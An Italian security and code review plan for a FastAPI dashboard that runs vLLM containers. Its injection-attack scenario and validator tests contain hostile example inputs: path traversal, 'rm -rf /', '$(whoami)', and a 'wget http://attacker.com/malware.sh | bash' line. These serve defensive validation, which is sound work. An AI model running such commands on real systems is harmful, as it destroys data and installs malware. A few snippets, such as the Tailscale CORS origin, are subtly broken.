# 🔴 Implementation Plan - Code Review & Improvements

**Data Review:** 2026-08-13  
**Versione Progetto:** 1.3.0  
**Priorità:** 🔴 = Critica | 🟠 = Alta | 🟡 = Media | 🟢 = Bassa

---

## 🎯 NOTA SULLA STRATEGIA DI SICUREZZA

Questo progetto è **pensato per rete locale + Tailscale**, non è un servizio internet pubblico.

**Philosophia corretta:**
- ✅ **Inferenza** (`/v1/chat/completions`) = Pubblica sulla LAN (è il prodotto)
- ✅ **Dashboard** (`/`) = CORS permesso per localhost + LAN + Tailscale
- 🔐 **Operazioni sensibili** (`/api/start`, `/api/pull`) = Richiedono API Key (proteggono risorse)
- 🔐 **Input Validation** = Stricta su model_name e extra_args (previene injection)

**Questo significa:**
- ❌ **NON** bloccare Open WebUI/Continue/Jan che fanno inferenza dalla LAN
- ❌ **NON** richiedere API Key per `/v1/chat/completions` (client mobile, browser, etc)
- ✅ **SÌ** proteggere chi può avviare/stoppare/pullare (solo API Key)
- ✅ **SÌ** validare tutti gli input (model_name, extra_args)

---

## 📊 IMPLEMENTATION STATUS

### Files Creati/Modificati

**FASE 1 - Completata:**
- ✅ `app/validators.py` - Input validation con whitelist
- ✅ `app/security.py` - CORS smart + API Key middleware
- ✅ `app/logging_config.py` - Structured logging
- ✅ `app/event_broadcaster.py` - Thread-safe event broadcaster per logs
- ✅ `.env.example` - Environment configuration template
- ✅ `requirements.txt` - Updated dependencies (pydantic, python-dotenv, pyyaml)
- ✅ `app/main.py` - Updated with security middleware + input validation
- ✅ `app/podman_cli.py` - Updated with EventBroadcaster (sostituisce asyncio.Queue)
- ✅ `README.md` - Added security & configuration section

**FASE 2 - Completata:**
- ✅ `app/config.py` - Centralized configuration system (dataclasses + ConfigLoader)
- ✅ `vllm-dashboard.yaml.example` - YAML configuration template
- ✅ `app/gpu_mon.py` - GPU VRAM auto-detection with multiple fallback methods
- ✅ `app/podman_cli.py` - Updated with timeouts (IMAGE_PULL_TIMEOUT, CONTAINER_START_TIMEOUT)
- ✅ `app/main.py` - Updated to initialize config + GPU VRAM + new `/api/config` endpoint
- ✅ `.env.example` - Added timeout parameters

**Cliente Integration:**
- ✅ `CLIENT_INTEGRATION_GUIDE.md` - Complete guide for remote clients

---

## 🎯 NOTA SULLA STRATEGIA DI SICUREZZA

Questo progetto è **pensato per rete locale + Tailscale**, non è un servizio internet pubblico.

**Philosophia corretta:**
- ✅ **Inferenza** (`/v1/chat/completions`) = Pubblica sulla LAN (è il prodotto)
- ✅ **Dashboard** (`/`) = CORS permesso per localhost + LAN + Tailscale
- 🔐 **Operazioni sensibili** (`/api/start`, `/api/pull`) = Richiedono API Key (proteggono risorse)
- 🔐 **Input Validation** = Stricta su model_name e extra_args (previene injection)

**Questo significa:**
- ❌ **NON** bloccare Open WebUI/Continue/Jan che fanno inferenza dalla LAN
- ❌ **NON** richiedere API Key per `/v1/chat/completions` (client mobile, browser, etc)
- ✅ **SÌ** proteggere chi può avviare/stoppare/pullare (solo API Key)
- ✅ **SÌ** validare tutti gli input (model_name, extra_args)

---

## 📋 INDICE PROBLEMATICHE

| Categoria | Severità | Conteggio |
|-----------|----------|-----------|
| 🔴 **Security Issues** | CRITICA | 4 |
| 🔴 **Error Handling** | CRITICA | 4 |
| 🟠 **Code Quality** | ALTA | 6 |
| 🟠 **Architecture** | ALTA | 7 |
| 🟡 **Performance** | MEDIA | 3 |
| 🟡 **Missing Features** | MEDIA | 6 |
| 🟢 **UI/UX** | BASSA | 3 |
| 🟢 **Configuration** | BASSA | 4 |
| ✅ **Verified Safe** | OK | 1 |

---

## 🔴 PROBLEMATICHE CRITICHE

### 1. **CORS Completamente Aperto per Rete Locale** - 🔴 SECURITY RISK
**File:** `app/main.py` (riga 32-37)  
**Problema REALE:**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],      # ❌ Permette da QUALSIASI internet (attacchi XSS)
    allow_credentials=True,   # ❌ Pericoloso
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Analisi del Threat Model Corretto:**
- ✅ **App desktop** (Open WebUI, Continue, Jan, Cursor) = **NO CORS issue** (non usano browser)
- ✅ **Server-to-server** (vLLM API calls) = **NO CORS issue** (non HTTP from browser)
- ⚠️ **Solo dashboard web locale** (browser) ha bisogno di CORS
- ❌ **Rischio reale:** Sito malvolo su internet che esegue `fetch()` verso il tuo server per controllare/disabilitare modelli

**Soluzione - Strategia a 2 Livelli:**

```python
# app/config.py
import socket
import os
from typing import List

def get_local_network_ips() -> List[str]:
    """Auto-detect IPs locali della rete"""
    ips = [
        "http://localhost:5000",
        "http://127.0.0.1:5000",
    ]
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        ips.append(f"http://{local_ip}:5000")
    except Exception:
        pass
    
    # Tailscale 100.x.x.x sempre permesso (è VPN privata)
    # Il browser farà richieste da https://100.X.X.X:5000
    ips.append("http://100.0.0.0/8")  # Tailscale IP range
    
    return ips

class SecurityConfig:
    # CORS per dashboard web locale + Tailscale + LAN
    DASHBOARD_ORIGINS = get_local_network_ips()
    
    # Operazioni che richiedono API Key (proteggono risorse server)
    PROTECTED_ENDPOINTS = {
        "/api/image/pull",      # ← Scarica immagine (banda + storage)
        "/api/start",           # ← Accendi container (CPU + VRAM)
        "/api/stop",            # ← Spegni container
    }
    
    # Operazioni pubbliche (come Ollama - inferenza puoi esporla)
    PUBLIC_ENDPOINTS = {
        "/v1/chat/completions", # ← Chat inference (è il tuo prodotto!)
        "/v1/completions",
        "/v1/models",
        "/api/tags",            # ← Ollama compatibility
        "/api/ps",
    }

# app/main.py
from fastapi.middleware.cors import CORSMiddleware
from app.config import SecurityConfig

# CORS: permetti solo rete locale + Tailscale
app.add_middleware(
    CORSMiddleware,
    allow_origins=SecurityConfig.DASHBOARD_ORIGINS,
    allow_credentials=False,
    allow_methods=["GET", "POST"],
    allow_headers=["Content-Type", "X-API-Key"],
)

# Middleware: proteggi operazioni sensibili con API Key
@app.middleware("http")
async def verify_protected_operations(request: Request, call_next):
    """
    Operazioni che usano risorse server richiedono API Key.
    Inferenza (chat/completions) è pubblica = libera sulla LAN.
    """
    path = request.url.path
    
    # Controlla se l'endpoint è protetto
    if any(path.startswith(ep) for ep in SecurityConfig.PROTECTED_ENDPOINTS):
        if request.method == "POST":
            api_key = request.headers.get("X-API-Key")
            expected_key = os.getenv("API_KEY", "")
            
            if not api_key or api_key != expected_key:
                return JSONResponse(
                    {"error": "Unauthorized - API Key required for this operation"},
                    status_code=401
                )
    
    return await call_next(request)
```

**Uso da Client (esempio):**
```bash
# ✅ Dashboard web (localhost) - CORS OK
curl -i http://localhost:5000

# ✅ Inferenza da Open WebUI (rete LAN) - Niente API Key
curl http://192.168.1.100:5000/v1/chat/completions -H "Content-Type: application/json" ...

# ✅ Inferenza da Tailscale - Niente API Key
curl http://100.x.x.x:5000/v1/chat/completions ...

# ✅ Pull immagine (richiede API Key)
curl -X POST http://192.168.1.100:5000/api/image/pull \
  -H "X-API-Key: your-secret-key"

# ❌ Attacco da internet
# Un sito malvolo NON può fare fetch verso il tuo server
# (CORS blocca + IP non è 100.x.x.x o localhost)
```

---

### 2. **Nessuna Validazione Input su model_name & extra_args** - 🔴 INJECTION ATTACK
**File:** `app/main.py` (riga 131, 145) + `app/podman_cli.py` (riga 50)  
**Problema REALE:**
```python
async def start_container(model_name: str, max_model_len: int = 2048, extra_args: str = "") -> Dict:
    model_path = DEFAULT_MODELS_DIR / model_name  # ❌ Nessuna validazione
    # ... 
    cmd.extend(extra_args.strip().split())  # ❌ extra_args potrebbe contenere comandi shell

# Un attacker sulla tua rete potrebbe:
# model_name = "../../etc/passwd"  → Path traversal
# extra_args = "--dtype float16; rm -rf /"  → Shell injection
```

**Scenario d'Attacco:**
1. Attacker sulla LAN chiama `/api/start` con `model_name = "../../etc/passwd"`
2. Legge file sensibili del filesystem
3. O con `extra_args = "float16 && wget http://attacker.com/malware.sh | bash"`
4. Esegue malware nel container

**Soluzione - Validazione Stretta:**

```python
# app/validators.py (NUOVO FILE)
import re
from pathlib import Path
from typing import List
import shlex

class ValidationError(Exception):
    pass

def validate_model_name(model_name: str) -> bool:
    """
    Valida nome modello: solo alphanumerico, -, _, .
    Vieta path traversal (../ non permesso)
    """
    if not model_name or len(model_name) > 255:
        raise ValidationError("Model name must be 1-255 characters")
    
    if ".." in model_name or "/" in model_name or "\\" in model_name:
        raise ValidationError("Model name cannot contain '..' or path separators")
    
    if not re.match(r'^[\w\-\.]+$', model_name):
        raise ValidationError("Model name can only contain letters, numbers, dash, underscore, dot")
    
    return True

def validate_and_sanitize_extra_args(extra_args: str) -> List[str]:
    """
    Whitelist di flag vLLM/Podman permessi.
    Vieta qualsiasi shell metacharacter.
    """
    if not extra_args or not extra_args.strip():
        return []
    
    # Flag vLLM permessi (base)
    ALLOWED_FLAGS = {
        "--dtype",                          # float16, float32, bfloat16
        "--gpu-memory-utilization",        # 0.7, 0.8
        "--max-model-len",                 # 2048, 4096
        "--tensor-parallel-size",          # 1, 2, 4
        "--pipeline-parallel-size",        # 1, 2
        "--num-scheduler-steps",           # 1, 5
        "--max-num-seqs",                  # 256, 512
    }
    
    # Vieta qualsiasi shell metacharacter
    FORBIDDEN_CHARS = {";", "|", "&", "`", "$", "(", ")", "<", ">", "*", "?", "[", "]", "{", "}"}
    
    for char in FORBIDDEN_CHARS:
        if char in extra_args:
            raise ValidationError(f"Extra args contains forbidden character: {char}")
    
    try:
        tokens = shlex.split(extra_args)
    except ValueError as e:
        raise ValidationError(f"Invalid shell syntax in extra_args: {str(e)}")
    
    result = []
    i = 0
    while i < len(tokens):
        token = tokens[i]
        
        if token.startswith("--"):
            # Estrai il flag (prima dell'=)
            flag = token.split("=")[0]
            
            if flag not in ALLOWED_FLAGS:
                raise ValidationError(f"Flag not allowed: {flag}")
            
            # Se il flag ha = (es: --dtype=float16), tutto ok
            if "=" in token:
                value = token.split("=", 1)[1]
                # Valida il valore
                if not re.match(r'^[\w\-\.]+$', value):
                    raise ValidationError(f"Invalid value for {flag}: {value}")
                result.append(token)
            else:
                # Flag separato dal valore
                result.append(token)
                if i + 1 < len(tokens) and not tokens[i + 1].startswith("--"):
                    # Prossimo token è il valore
                    value = tokens[i + 1]
                    if not re.match(r'^[\w\-\.]+$', value):
                        raise ValidationError(f"Invalid value for {flag}: {value}")
                    result.append(value)
                    i += 1
        else:
            raise ValidationError(f"Unexpected token: {token}")
        
        i += 1
    
    return result

# app/main.py
from app.validators import validate_model_name, validate_and_sanitize_extra_args, ValidationError

@app.post("/api/start")
async def api_start_model(req: StartModelRequest):
    """Starts vLLM Podman container with the specified model and options."""
    
    # Valida input PRIMA di usarli
    try:
        validate_model_name(req.model_name)
        safe_extra_args = validate_and_sanitize_extra_args(req.extra_args)
    except ValidationError as e:
        raise HTTPException(status_code=400, detail=f"Invalid input: {str(e)}")
    
    # Adesso passa ai servizi
    res = await start_container(
        model_name=req.model_name,
        max_model_len=req.max_model_len,
        extra_args=" ".join(safe_extra_args)  # ✅ Safe
    )
    
    if not res["success"]:
        raise HTTPException(status_code=400, detail=res["message"])
    return res
```

**Test della Validazione:**
```python
# test_validators.py
import pytest
from app.validators import validate_model_name, validate_and_sanitize_extra_args, ValidationError

def test_valid_model_name():
    assert validate_model_name("Qwen2.5-7B-Instruct-AWQ")
    assert validate_model_name("llama-2-70b")
    assert validate_model_name("model_v1")

def test_invalid_model_name():
    with pytest.raises(ValidationError):
        validate_model_name("../../etc/passwd")  # Path traversal
    
    with pytest.raises(ValidationError):
        validate_model_name("model; rm -rf /")  # Shell injection
    
    with pytest.raises(ValidationError):
        validate_model_name("model$(whoami)")  # Command injection

def test_valid_extra_args():
    args = "--dtype float16 --gpu-memory-utilization 0.7"
    result = validate_and_sanitize_extra_args(args)
    assert "--dtype" in result
    assert "float16" in result

def test_invalid_extra_args():
    with pytest.raises(ValidationError):
        validate_and_sanitize_extra_args("--dtype float16; rm -rf /")
    
    with pytest.raises(ValidationError):
        validate_and_sanitize_extra_args("--unknown-flag value")
    
    with pytest.raises(ValidationError):
        validate_and_sanitize_extra_args("--dtype $(whoami)")
```

---

### 3. **Queue Globale Non Thread-Safe** - 🔴 RACE CONDITION
**File:** `app/podman_cli.py` (riga 10)  
**Problema:**
```python
# Global log queue for real-time system events
system_log_queue = asyncio.Queue()  # ❌ Shared state, non sincronizzata
```

Con più WebSocket connessi, questa queue è un race condition.

**Soluzione:**
Usare un `asyncio.Event` + lock interno o un sistema di pubsub:

```python
# Opzione 1: Broadcast events
import weakref
from typing import Set, Callable

class EventBroadcaster:
    def __init__(self):
        self._subscribers: Set[asyncio.Queue] = weakref.WeakSet()
        self._lock = asyncio.Lock()
    
    async def subscribe(self) -> asyncio.Queue:
        queue = asyncio.Queue()
        async with self._lock:
            self._subscribers.add(queue)
        return queue
    
    async def broadcast(self, message: str):
        async with self._lock:
            for queue in list(self._subscribers):
                try:
                    queue.put_nowait(message)
                except asyncio.QueueFull:
                    pass

system_events = EventBroadcaster()

# In pull_image:
await system_events.broadcast(f"[PODMAN PULL] Avvio download...")

# In WebSocket:
@app.websocket("/ws/logs")
async def ws_container_logs(websocket: WebSocket):
    await websocket.accept()
    queue = await system_events.subscribe()
    try:
        while True:
            msg = await queue.get()
            await websocket.send_text(msg)
    except WebSocketDisconnect:
        pass
```

---

### 4. **Exception Handling Troppo Generico** - 🔴 DEBUG DIFFICULTY
**File:** `app/main.py` (righe 422, 430)  
**Problema:**
```python
@app.websocket("/ws/gpu")
async def ws_gpu_telemetry(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            telemetry = get_system_telemetry()
            await websocket.send_json(telemetry)
            await asyncio.sleep(1.0)
    except (WebSocketDisconnect, asyncio.CancelledError):
        pass
    except Exception:  # ❌ Swallow di eccezioni - impossibile debuggare
        pass
```

Se capita un bug, non lo vedrai mai.

**Soluzione:**
```python
import logging

logger = logging.getLogger(__name__)

@app.websocket("/ws/gpu")
async def ws_gpu_telemetry(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            try:
                telemetry = get_system_telemetry()
                await websocket.send_json(telemetry)
            except Exception as e:
                logger.error(f"Error getting telemetry: {e}", exc_info=True)
                await asyncio.sleep(2)  # Backoff
            await asyncio.sleep(1.0)
    except WebSocketDisconnect:
        logger.debug("GPU telemetry client disconnected")
    except asyncio.CancelledError:
        logger.debug("GPU telemetry websocket cancelled")
```

---

### 5. **CORS Non Blocca Rete Locale (Configurazione Corretta)** - 🟢 VERIFICATO
**File:** `app/main.py` (riga 32-37)  
**STATUS:** ✅ Affrontato nel #1 con strategia 2-livelli

La soluzione del #1 garantisce:
- ✅ Dashboard web locale = CORS permesso
- ✅ Inferenza da rete LAN = Niente API Key richiesta
- ✅ Tailscale remoto = CORS permesso + Niente API Key per `/v1/chat/completions`
- ✅ Operazioni sensibili (`/api/start`, `/api/pull`, `/api/stop`) = API Key richiesta

**Nessun blocco di funzionalità legittima** ✅

---

## 🟠 PROBLEMATICHE ARCHITETTURALI

### 6. **VRAM Totale Hardcodato** - 🟠 ARCHITECTURE
**File:** `app/gpu_mon.py` (riga 3)  
**Problema:**
```python
TOTAL_VRAM_MB = 16384.0  # ❌ Hardcodato per B580
```

Non funziona con altre GPU (A770 ha 8GB, A750 ha 4GB, Data Center ha 32GB+).

**Soluzione:**
```python
import subprocess
import json

def detect_total_vram() -> float:
    """Rileva automaticamente VRAM totale dalla GPU Intel"""
    try:
        # Tenta con lspci + grep
        result = subprocess.run(
            ["lspci", "-v", "-s", "$(lspci | grep -i 'vga.*intel' | cut -d: -f1)"],
            capture_output=True,
            text=True,
            timeout=5
        )
        # Cerca "prefetchable memory" in output
        for line in result.stdout.split("\n"):
            if "Memory at" in line or "prefetchable" in line:
                # Parse VRAM size
                pass
    except Exception:
        pass
    
    # Fallback: leggi da sysfs
    try:
        for f in Path("/sys/class/drm/").glob("renderD*"):
            # Leggi proprietà GPU
            pass
    except Exception:
        pass
    
    # Ultimo fallback: usa valore default
    return 16384.0

TOTAL_VRAM_MB = detect_total_vram()
```

---

### 7. **Magic Strings Sparsi nel Codice** - 🟠 CODE QUALITY
**File:** Tutto il codice  
**Problema:**
```python
# app/main.py
IMAGE_NAME = "docker.io/intel/vllm:0.17.0-xpu"  # riga 15
CONTAINER_NAME = "vllm-intel-arc"  # riga 14
"http://localhost:8000/v1/models"  # riga 49
"http://localhost:8000/v1/chat/completions"  # riga 173
```

Se devi cambiare versione immagine, devi cercare ovunque.

**Soluzione:**
```python
# app/config.py (NUOVO FILE)
from pathlib import Path
from typing import Optional
import os

class Config:
    # Docker/Podman
    CONTAINER_NAME: str = os.getenv("CONTAINER_NAME", "vllm-intel-arc")
    IMAGE_NAME: str = os.getenv("IMAGE_NAME", "docker.io/intel/vllm:0.17.0-xpu")
    REGISTRY: str = os.getenv("REGISTRY", "docker.io")
    
    # vLLM API
    VLLM_HOST: str = os.getenv("VLLM_HOST", "localhost")
    VLLM_PORT: int = int(os.getenv("VLLM_PORT", 8000))
    VLLM_API_BASE: str = f"http://{VLLM_HOST}:{VLLM_PORT}/v1"
    
    # Server
    SERVER_HOST: str = os.getenv("SERVER_HOST", "0.0.0.0")
    SERVER_PORT: int = int(os.getenv("SERVER_PORT", 5000))
    
    # Models
    MODELS_DIR: Path = Path(os.getenv("MODELS_DIR", "~/my_models")).expanduser()
    
    # GPU
    GPU_TELEMETRY_INTERVAL: float = float(os.getenv("GPU_TELEMETRY_INTERVAL", 1.0))
    
    # Security
    ALLOWED_ORIGINS: list[str] = [
        "http://localhost:5000",
        "http://127.0.0.1:5000",
    ]
    
    # Timeouts (secondi)
    VLLM_READY_TIMEOUT: int = 120
    PULL_IMAGE_TIMEOUT: int = 600
    CONTAINER_START_TIMEOUT: int = 120

config = Config()

# Uso in main.py:
from app.config import config

resp = await client.get(f"{config.VLLM_API_BASE}/models")
```

---

### 8. **Nessun Logging Strutturato** - 🟠 DEBUGGING
**File:** Tutto il codice  
**Problema:**
```python
# Usa solo print() e asyncio.Queue
await system_log_queue.put(f"[PODMAN PULL] {decoded_line}")  # ❌ String format
```

Impossibile filtrare per livello (DEBUG, INFO, WARNING, ERROR) o inviare a centralizzato.

**Soluzione:**
```python
# app/logging_config.py
import logging
import logging.handlers
from pathlib import Path

LOG_DIR = Path.home() / ".vllm-dashboard" / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)

def setup_logging():
    """Configure structured logging"""
    logger = logging.getLogger("vllm_dashboard")
    logger.setLevel(logging.DEBUG)
    
    # File handler
    fh = logging.handlers.RotatingFileHandler(
        LOG_DIR / "app.log",
        maxBytes=10 * 1024 * 1024,  # 10MB
        backupCount=5
    )
    fh.setLevel(logging.DEBUG)
    
    # Console handler
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    
    # Formatter
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    fh.setFormatter(formatter)
    ch.setFormatter(formatter)
    
    logger.addHandler(fh)
    logger.addHandler(ch)
    
    return logger

logger = setup_logging()

# Uso:
logger.info("Pulling image docker.io/intel/vllm:0.17.0-xpu")
logger.error("Failed to start container", exc_info=True)
logger.debug(f"Container status: {status}")
```

---

### 9. **Processi Podman Non Terminati su Shutdown** - 🟠 RESOURCE LEAK
**File:** `app/podman_cli.py` (riga 276)  
**Problema:**
```python
async def stream_logs() -> AsyncGenerator[str, None]:
    """..."""
    while True:  # ❌ Loop infinito, mai termina
        # ...
        proc = await asyncio.create_subprocess_exec(...)
        try:
            while True:
                line = await asyncio.wait_for(...)
                yield line
        finally:
            if proc.returncode is None:
                try:
                    proc.terminate()  # ✓ Buono
                except Exception:
                    pass
```

Se l'app va in crash, `podman logs` resta attivo.

**Soluzione:**
```python
import atexit
import signal

class ProcessManager:
    _active_processes = []
    
    @classmethod
    def register(cls, proc):
        cls._active_processes.append(proc)
    
    @classmethod
    async def cleanup(cls):
        """Terminate all active processes"""
        for proc in cls._active_processes:
            if proc.returncode is None:
                try:
                    proc.terminate()
                    await asyncio.wait_for(proc.wait(), timeout=5)
                except Exception:
                    proc.kill()

# In main.py:
async def shutdown():
    logger.info("Shutting down...")
    await ProcessManager.cleanup()
    await stop_container()

if __name__ == "__main__":
    import uvicorn
    
    # Setup shutdown handler
    def on_signal(sig, frame):
        asyncio.run(shutdown())
        exit(0)
    
    signal.signal(signal.SIGTERM, on_signal)
    signal.signal(signal.SIGINT, on_signal)
    
    uvicorn.run("app.main:app", host="0.0.0.0", port=5000)
```

---

## 🟡 PROBLEMATICHE DI PERFORMANCE

### 10. **scan_models() Scansiona Filesystem Ogni Volta** - 🟡 PERFORMANCE
**File:** `app/podman_cli.py` (riga 18)  
**Problema:**
```python
@app.get("/api/models")
async def get_models():
    """Lists available model directories in ~/my_models."""
    return scan_models()  # ❌ Filesystem scan ogni richiesta
```

Se hai molti file, scansione lenta. Endpoint chiamato ogni secondo da frontend.

**Soluzione:**
```python
from functools import lru_cache
import time

class ModelCache:
    def __init__(self, ttl_seconds=30):
        self.ttl = ttl_seconds
        self.cache = None
        self.last_update = 0
    
    def get(self):
        now = time.time()
        if self.cache is None or (now - self.last_update) > self.ttl:
            self.cache = self._scan()
            self.last_update = now
        return self.cache
    
    @staticmethod
    def _scan():
        return scan_models()
    
    def invalidate(self):
        """Invalida cache dopo pull/start"""
        self.cache = None
        self.last_update = 0

model_cache = ModelCache(ttl_seconds=30)

@app.get("/api/models")
async def get_models():
    return model_cache.get()

@app.post("/api/start")
async def api_start_model(req: StartModelRequest):
    res = await start_container(...)
    if res["success"]:
        model_cache.invalidate()  # Invalida dopo cambio
    return res
```

---

### 11. **wait_for_vllm_ready() Polling Inefficiente** - 🟡 PERFORMANCE
**File:** `app/main.py` (riga 44)  
**Problema:**
```python
async def wait_for_vllm_ready(timeout_secs: int = 60) -> bool:
    start_time = asyncio.get_event_loop().time()
    async with httpx.AsyncClient(timeout=3.0) as client:
        while asyncio.get_event_loop().time() - start_time < timeout_secs:
            try:
                resp = await client.get("http://localhost:8000/v1/models")
                if resp.status_code == 200:
                    return True
            except Exception:
                pass
            await asyncio.sleep(2.0)  # ❌ Sleep fisso, 30 tentativi per minuto
    return False
```

2 secondi è troppo lungo, si spreca tempo.

**Soluzione:**
```python
async def wait_for_vllm_ready(timeout_secs: int = 120, initial_delay: float = 0.5) -> bool:
    """Exponential backoff per polling"""
    start_time = asyncio.get_event_loop().time()
    delay = initial_delay
    
    async with httpx.AsyncClient(timeout=3.0) as client:
        while asyncio.get_event_loop().time() - start_time < timeout_secs:
            try:
                resp = await client.get(f"{config.VLLM_API_BASE}/models")
                if resp.status_code == 200:
                    logger.info("vLLM ready")
                    return True
            except httpx.ConnectError:
                pass  # Aspetta ancora
            except Exception as e:
                logger.warning(f"vLLM health check error: {e}")
            
            elapsed = asyncio.get_event_loop().time() - start_time
            remaining = timeout_secs - elapsed
            sleep_time = min(delay, remaining)
            
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)
            
            delay = min(delay * 1.5, 5.0)  # Cap a 5 secondi
    
    logger.error(f"vLLM not ready after {timeout_secs}s")
    return False
```

---

### 12. **stream_logs() Loop Infinito Inefficiente** - 🟡 PERFORMANCE
**File:** `app/podman_cli.py` (riga 251)  
**Problema:**
```python
async def stream_logs() -> AsyncGenerator[str, None]:
    has_warned_missing = False
    
    while True:  # ❌ Gira sempre, anche quando nessuno ascolta
        try:
            while not system_log_queue.empty():
                # ...
```

Se nessun client WebSocket è connesso, la funzione giace dormiente.

**Soluzione:**
```python
# Usa context manager per registrare listeners
class LogStreamer:
    def __init__(self):
        self._subscribers = {}
        self._lock = asyncio.Lock()
        self._monitor_task = None
    
    async def subscribe(self, client_id: str) -> AsyncGenerator[str, None]:
        queue = asyncio.Queue(maxsize=100)
        async with self._lock:
            self._subscribers[client_id] = queue
        
        try:
            while True:
                try:
                    msg = await asyncio.wait_for(queue.get(), timeout=60)
                    yield msg
                except asyncio.TimeoutError:
                    # Keep-alive ping
                    yield "\n"
        finally:
            async with self._lock:
                self._subscribers.pop(client_id, None)
    
    async def _monitor_logs(self):
        """Solo gira quando ci sono subscribers"""
        while True:
            has_subscribers = False
            
            async with self._lock:
                has_subscribers = len(self._subscribers) > 0
            
            if not has_subscribers:
                await asyncio.sleep(1)
                continue
            
            # Stream logs...
            async for line in _get_podman_logs():
                async with self._lock:
                    for queue in self._subscribers.values():
                        try:
                            queue.put_nowait(line)
                        except asyncio.QueueFull:
                            pass

log_streamer = LogStreamer()

@app.websocket("/ws/logs")
async def ws_container_logs(websocket: WebSocket):
    await websocket.accept()
    client_id = str(id(websocket))
    try:
        async for line in log_streamer.subscribe(client_id):
            await websocket.send_text(line)
    except WebSocketDisconnect:
        pass
```

---

## 🟡 FEATURE MANCANTI

### 13. **Nessun Timeout su Operazioni Lunghe** - 🟡 RELIABILITY
**File:** `app/podman_cli.py` (riga 100)  
**Problema:**
```python
async def pull_image() -> Dict:
    """Pulls docker.io/intel/vllm:0.17.0-xpu while streaming live progress..."""
    try:
        await system_log_queue.put(f"[PODMAN PULL] Avvio download...")
        proc = await asyncio.create_subprocess_exec(
            "podman", "pull", IMAGE_NAME,
            # ❌ Nessun timeout
        )
```

Se la rete muore, `podman pull` aspetta infinitamente.

**Soluzione:**
```python
async def pull_image(timeout: int = 600) -> Dict:  # 10 minuti
    """Pulls image with timeout"""
    try:
        await system_events.broadcast(f"[PODMAN PULL] Avvio download...")
        
        try:
            proc = await asyncio.wait_for(
                asyncio.create_subprocess_exec(
                    "podman", "pull", IMAGE_NAME,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT
                ),
                timeout=timeout
            )
        except asyncio.TimeoutError:
            return {"success": False, "message": f"Pull timeout dopo {timeout}s"}
        
        # ... resto codice
```

---

### 14. **Nessun Health Check Endpoint** - 🟡 RELIABILITY
**File:** `app/main.py`  
**Problema:**
Non c'è endpoint `/health` per monitorare salute dell'app da esterni (load balancer, systemd, etc).

**Soluzione:**
```python
@app.get("/health", response_class=JSONResponse)
async def health_check():
    """Kubernetes-style health check"""
    checks = {
        "status": "ok",
        "timestamp": datetime.utcnow().isoformat(),
        "checks": {}
    }
    
    # Check vLLM connectivity
    try:
        async with httpx.AsyncClient(timeout=2) as client:
            resp = await client.get(f"{config.VLLM_API_BASE}/models")
            checks["checks"]["vllm"] = "up" if resp.status_code == 200 else "down"
    except Exception:
        checks["checks"]["vllm"] = "down"
    
    # Check Podman connectivity
    try:
        result = subprocess.run(["podman", "version"], capture_output=True, timeout=2)
        checks["checks"]["podman"] = "up" if result.returncode == 0 else "down"
    except Exception:
        checks["checks"]["podman"] = "down"
    
    # Check filesystem
    try:
        (config.MODELS_DIR / ".test").touch()
        (config.MODELS_DIR / ".test").unlink()
        checks["checks"]["filesystem"] = "up"
    except Exception:
        checks["checks"]["filesystem"] = "down"
    
    all_ok = all(v == "up" for v in checks["checks"].values())
    status_code = 200 if all_ok else 503
    
    return JSONResponse(checks, status_code=status_code)
```

---

### 15. **Nessun Retry Logic su Operazioni Critiche** - 🟡 RELIABILITY
**File:** `app/main.py` (riga 131)  
**Problema:**
```python
async def ensure_model_running(requested_model_name: str = None) -> str:
    # ...
    start_res = await start_container(...)
    if not start_res.get("success"):
        raise HTTPException(status_code=500, detail=...)
    # ❌ Se fallisce una volta, fallisce il tutto
```

Dovrebbe tentare più volte.

**Soluzione:**
```python
from tenacity import retry, stop_after_attempt, wait_exponential

@retry(
    stop=stop_after_attempt(3),
    wait=wait_exponential(multiplier=1, min=2, max=10),
    reraise=True
)
async def ensure_model_running_with_retry(requested_model_name: str = None) -> str:
    # ... stesso codice
    pass

# Oppure manualmente:
async def ensure_model_running(requested_model_name: str = None, max_retries: int = 3) -> str:
    for attempt in range(max_retries):
        try:
            # ... logica
            return target_model
        except HTTPException as e:
            if attempt < max_retries - 1:
                wait_time = 2 ** attempt  # Exponential backoff
                logger.warning(f"Attempt {attempt + 1} failed, retrying in {wait_time}s...")
                await asyncio.sleep(wait_time)
            else:
                raise
```

---

### 16. **Nessuno Script di Backup/Restore Modelli** - 🟡 USABILITY
**Problema:**
Se l'utente reinstalla, i modelli vanno persi.

**Soluzione:** Creare `backup_models.sh` e `restore_models.sh`:
```bash
#!/bin/bash
# backup_models.sh

BACKUP_DIR="$HOME/.vllm-dashboard/backups"
MODELS_DIR="$HOME/my_models"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="$BACKUP_DIR/models_backup_${TIMESTAMP}.tar.xz"

mkdir -p "$BACKUP_DIR"

if [ -d "$MODELS_DIR" ]; then
    tar -I xz -cf "$BACKUP_FILE" -C "$HOME" my_models
    echo "✓ Backup creato: $BACKUP_FILE"
else
    echo "✗ Cartella $MODELS_DIR non trovata"
    exit 1
fi
```

---

### 17. **Nessuna Documentazione API** - 🟡 USABILITY
**Problema:**
Non c'è Swagger/OpenAPI autogenerato.

**Soluzione:**
```python
from fastapi import FastAPI
from fastapi.openapi.utils import get_openapi

app = FastAPI(
    title="vLLM Intel Arc Manager API",
    description="REST API per gestire LLM su GPU Intel Arc con Podman",
    version="1.3.0",
    docs_url="/docs",  # Swagger UI
    redoc_url="/redoc",  # ReDoc
)

# Oppure custom openapi:
def custom_openapi():
    if app.openapi_schema:
        return app.openapi_schema
    openapi_schema = get_openapi(...)
    app.openapi_schema = openapi_schema
    return app.openapi_schema

app.openapi = custom_openapi
```

Aggiungere docstring alle funzioni:
```python
@app.post("/api/start")
async def api_start_model(req: StartModelRequest):
    """
    Avvia il container vLLM con il modello specificato.
    
    - **model_name**: Nome cartella in ~/my_models
    - **max_model_len**: Token massimi per sequenza (default: 2048)
